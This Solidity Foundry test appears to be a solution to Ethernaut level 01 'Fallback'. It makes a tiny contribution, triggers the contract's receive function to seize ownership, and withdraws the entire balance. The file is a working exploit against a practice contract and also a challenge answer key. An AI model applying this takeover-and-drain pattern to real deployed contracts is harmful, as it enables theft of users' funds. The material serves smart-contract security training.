// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Fallback} from "../src/01_Fallback.sol";
import {Test} from "forge-std/Test.sol";

/// @title Ethernaut 01 - Fallback Solution Test
/// @notice Verifies that a contributor can seize ownership through receive and withdraw the balance.
contract FallbackTest is Test {
    /// @notice Account used to solve the level.
    address player = makeAddr("player");

    /// @notice Vulnerable target contract.
    Fallback target;

    /// @notice Funds the player and deploys a fresh target before each test.
    function setUp() public {
        vm.deal(player, 1 ether);
        target = new Fallback();
    }

    /// @notice Completes the Fallback level by taking ownership and withdrawing the balance.
    function testSolve() public {
        vm.startPrank(player);

        // 1. Make a minimal contribution to satisfy receive's contribution check.
        target.contribute{value: 1 wei}();
        assertEq(target.getContribution(), 1 wei);

        // 2. Send ETH with empty calldata to trigger receive.
        (bool success,) = address(target).call{value: 1 wei}("");
        require(success, "ETH transfer failed");

        // 3. Verify that receive assigned ownership to the player.
        assertEq(target.owner(), player);

        // 4. Use the acquired owner privilege to withdraw the entire balance.
        target.withdraw();

        // 5. Confirm that the target balance is now zero.
        assertEq(address(target).balance, 0);

        vm.stopPrank();
    }
}
